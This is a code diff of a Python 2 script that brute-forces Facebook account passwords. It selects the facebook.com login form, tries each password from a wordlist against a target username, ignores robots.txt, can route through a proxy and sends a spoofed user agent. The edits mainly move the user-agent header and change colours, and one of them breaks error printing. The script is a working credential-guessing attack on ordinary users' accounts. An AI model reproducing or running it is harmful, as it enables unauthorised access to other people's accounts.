@@ -126,7 +126,7 @@ def FBOM(username, wordlist, proxy=None):
 ==================================
 [---]  """+wi+"""BruteForce Facebook  """+gr+""" [---]
 ==================================
-[---]         """+wi+"""CONFIG"""+gr+"""         [---]
+[---]         """+yl+"""CONFIG"""+gr+"""         [---]
 ==================================
 [>] Target      :> """+wi+username+gr+"""
 [>] Wordlist    :> """+yl+str(wordlist)+gr+"""
@@ -140,16 +140,15 @@ def FBOM(username, wordlist, proxy=None):
     br.set_handle_robots(False)
     if useproxy !=False:
         br.set_proxies({'http':useproxy})
-    wfile = open(wordlist, "r")
     user_agent = useragent()
+    br.addheaders=[('User-agent',user_agent)]
+    wfile = open(wordlist, "r")
     for passwd in wfile:
         if not passwd.strip():continue
         passwd = passwd.strip()
         try:
             print(wi+"["+yl+str(loop)+wi+"]~["+yl+"~"+wi+"] Trying Password:>[ "+yl+str(passwd)+wi)
-            br.addheaders=[('User-agent',user_agent)]
             br.open("https://facebook.com")
-            br._factory.is_html = True
             br.select_form(nr=0)
             br.form["email"]=username
             br.form["pass"]=passwd
@@ -175,7 +174,7 @@ def FBOM(username, wordlist, proxy=None):
             wfile.close()
             exit(1)
         except Exception, e:
-            print(rd+"\n["+yl+"!"+rd+"] Error: "+yl+str(e)+wi)
+            print(rd+"\n["+yl+"!"+rd+"] Error: "+yl+e+wi)
             wfile.close()
             exit(1)
             
@@ -234,7 +233,8 @@ def Main():
        exit(1)
        
 if __name__=='__main__':
-	Main()	
+	Main()
+	
 ##############################################################
 ##################### 		     #########################
 #####################   END OF TOOL  #########################
